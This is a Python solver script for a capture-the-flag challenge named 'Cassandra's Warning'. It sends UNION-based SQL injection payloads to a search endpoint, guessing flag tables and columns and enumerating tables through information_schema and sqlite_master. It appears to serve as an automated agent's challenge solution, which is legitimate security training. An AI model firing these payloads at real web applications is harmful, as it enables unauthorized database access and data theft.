"""Cassandra's Warning: SQL Injection solver."""
import requests
from flag_utils import extract_flag

class CassandraSolver:
    """SQL Injection to extract flag from hidden table."""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = agent.base_url

    def solve(self):
        """
        GET /search?name=... with SQL injection to extract flag.
        Standard UNION injection to dump from a hidden flags table.
        """
        print("=== Cassandra's Warning: SQL Injection ===", flush=True)

        # First, probe to understand the query structure
        # Standard approach: ' UNION SELECT ... --
        # Response shape: id, name, role (3 fields)

        # Common flag table names to try
        flag_tables = ["flags", "flag", "secrets", "admin"]

        for table in flag_tables:
            # Try to extract from various flag column names
            for col in ["flag", "value", "secret", "data", "content"]:
                payload = f"' UNION SELECT 1,{col},3 FROM {table}-- "
                try:
                    resp = requests.get(
                        f"{self.base_url}/search",
                        params={"name": payload},
                        timeout=10
                    )
                    print(f"Trying {table}.{col}: {resp.status_code}", flush=True)
                    print(f"Response preview: {resp.text[:500]}", flush=True)

                    # Look for flag pattern in response
                    flag = extract_flag(resp.text)
                    if flag:
                        print(f"Found flag: {flag}", flush=True)
                        return flag
                except Exception as e:
                    print(f"Error with {table}.{col}: {e}", flush=True)

        # Try more aggressive enumeration
        # List all tables
        payloads = [
            "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- ",
            "' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- ",
        ]

        for payload in payloads:
            try:
                resp = requests.get(
                    f"{self.base_url}/search",
                    params={"name": payload},
                    timeout=10
                )
                print(f"Table enumeration: {resp.status_code}", flush=True)
                print(f"Response: {resp.text[:1000]}", flush=True)

                # Parse table names and try them
                import re
                tables = re.findall(r'"name":\s*"([^"]+)"', resp.text)
                for tbl in tables:
                    if tbl.lower() in ["flags", "flag", "secrets"]:
                        # Try extracting from this table
                        for col in ["flag", "value", "secret"]:
                            sub_payload = f"' UNION SELECT 1,{col},3 FROM {tbl}-- "
                            sub_resp = requests.get(
                                f"{self.base_url}/search",
                                params={"name": sub_payload},
                                timeout=10
                            )
                            flag = extract_flag(sub_resp.text)
                            if flag:
                                return flag
            except Exception as e:
                print(f"Error in enumeration: {e}", flush=True)

        print("Failed to extract flag", flush=True)
        return None
